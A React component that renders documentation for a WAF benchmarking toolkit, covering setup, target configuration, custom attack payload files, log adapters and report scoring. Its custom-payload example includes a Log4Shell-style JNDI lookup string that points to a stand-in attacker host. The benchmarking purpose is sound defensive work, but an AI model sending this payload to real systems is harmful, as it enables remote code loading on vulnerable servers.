import React from 'react';
import { Book, Code, Shield, Terminal, Zap, FileText } from 'lucide-react';

const Docs = () => {
    return (
        <div className="max-w-4xl mx-auto space-y-12 pb-20">
            {/* Header */}
            <div className="space-y-4 border-b border-zinc-800 pb-8">
                <h1 className="text-4xl font-bold text-white tracking-tight">Documentation</h1>
                <p className="text-lg text-zinc-400">
                    Comprehensive guide to configuring, extending, and mastering the WAF Benchmark Toolkit.
                </p>
            </div>

            {/* Quick Start */}
            <Section title="Quick Start" icon={<Zap className="text-yellow-500" />}>
                <div className="prose prose-invert max-w-none">
                    <p>
                        Get up and running with a standard benchmark in less than 2 minutes.
                    </p>
                    <ol className="list-decimal list-inside space-y-2 text-zinc-300">
                        <li>Ensure the stack is running: <code className="bg-zinc-900 px-2 py-1 rounded text-sm">docker-compose up -d</code></li>
                        <li>Navigate to the <strong>Overview</strong> dashboard.</li>
                        <li>Check the <strong>Target Status</strong> card to ensure the WAF is reachable.</li>
                        <li>Click the blue <strong>Start Benchmark</strong> button.</li>
                        <li>Watch the live logs and traffic chart.</li>
                        <li>Once complete, download the report from the <strong>Reports</strong> tab.</li>
                    </ol>
                </div>
            </Section>

            {/* Configuration */}
            <Section title="Configuration" icon={<Terminal className="text-blue-500" />}>
                <div className="space-y-6">
                    <p className="text-zinc-300">
                        WBT can be configured via the UI's <strong>System Config</strong> page or by editing YAML files directly.
                    </p>

                    <div className="space-y-4">
                        <h3 className="text-lg font-semibold text-white">Target Definition</h3>
                        <p className="text-zinc-400 text-sm">Located in <code className="text-zinc-300">configs/target.yaml</code></p>
                        <CodeBlock language="yaml">
                            {`target:
  url: "http://waf_target:8080"  # The entry point of your WAF
  timeout: 10                     # Request timeout in seconds
  concurrency: 5                  # Concurrent users
  headers:                        # Custom headers
    Authorization: "Bearer token"
    X-Custom-ID: "123"`}
                        </CodeBlock>
                    </div>
                </div>
            </Section>

            {/* Custom Payloads */}
            <Section title="Custom Attacks" icon={<Code className="text-pink-500" />}>
                <div className="space-y-6">
                    <p className="text-zinc-300">
                        Add your own attack vectors by creating new <code className="bg-zinc-900 px-1 py-0.5 rounded">.yaml</code> files in the <code className="bg-zinc-900 px-1 py-0.5 rounded">payloads/</code> directory.
                    </p>
                    <CodeBlock language="yaml">
                        {`category: "Zero Day Exploit"
vectors:
  - id: "cve-2026-001"
    payload: "${'{'}jndi:ldap://hacker.com/exploit${'}'}"
    method: "POST"
    location: "header"`}
                    </CodeBlock>
                </div>
            </Section>

            {/* Adapters */}
            <Section title="WAF Adapters" icon={<Shield className="text-emerald-500" />}>
                <p className="text-zinc-300 mb-4">
                    Adapters allow WBT to read logs from different WAF providers to correlate attacks with blocked events.
                </p>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="p-4 bg-zinc-900/50 border border-zinc-800 rounded-lg">
                        <h4 className="font-semibold text-white mb-2">ModSecurity (Default)</h4>
                        <p className="text-sm text-zinc-400">Reads <code className="text-zinc-300">modsec_audit.log</code> directly from the shared volume.</p>
                    </div>
                    <div className="p-4 bg-zinc-900/50 border border-zinc-700/50 border-dashed rounded-lg opacity-60">
                        <h4 className="font-semibold text-white mb-2">AWS WAF (Coming Soon)</h4>
                        <p className="text-sm text-zinc-400">Will fetch logs via CloudWatch API.</p>
                    </div>
                </div>
            </Section>

            {/* Reports */}
            <Section title="Understanding Reports" icon={<FileText className="text-purple-500" />}>
                <ul className="space-y-3 text-zinc-300">
                    <li className="flex items-start gap-3">
                        <span className="px-2 py-0.5 rounded bg-green-500/10 text-green-500 text-xs border border-green-500/20 mt-1">Score</span>
                        <span>0-100 rating. Higher is better. Penalized heavily by bypasses.</span>
                    </li>
                    <li className="flex items-start gap-3">
                        <span className="px-2 py-0.5 rounded bg-red-500/10 text-red-500 text-xs border border-red-500/20 mt-1">Bypass</span>
                        <span><strong>Critical Failure.</strong> An attack request returned a 200 OK status code.</span>
                    </li>
                    <li className="flex items-start gap-3">
                        <span className="px-2 py-0.5 rounded bg-orange-500/10 text-orange-500 text-xs border border-orange-500/20 mt-1">False Positive</span>
                        <span>A legitimate user request was blocked (403). Bad for UX.</span>
                    </li>
                </ul>
            </Section>

        </div>
    );
};

const Section = ({ title, icon, children }) => (
    <section className="space-y-4">
        <div className="flex items-center gap-3 border-b border-zinc-800/50 pb-2 mb-4">
            {React.cloneElement(icon, { size: 24 })}
            <h2 className="text-2xl font-semibold text-zinc-100">{title}</h2>
        </div>
        {children}
    </section>
);

const CodeBlock = ({ language, children }) => (
    <div className="relative group rounded-lg overflow-hidden border border-zinc-800 bg-[#0d0d10]">
        <div className="absolute right-2 top-2 text-[10px] font-mono text-zinc-500 uppercase">{language}</div>
        <pre className="p-4 overflow-x-auto text-sm font-mono text-zinc-300 leading-relaxed">
            <code>{children}</code>
        </pre>
    </div>
);

export default Docs;
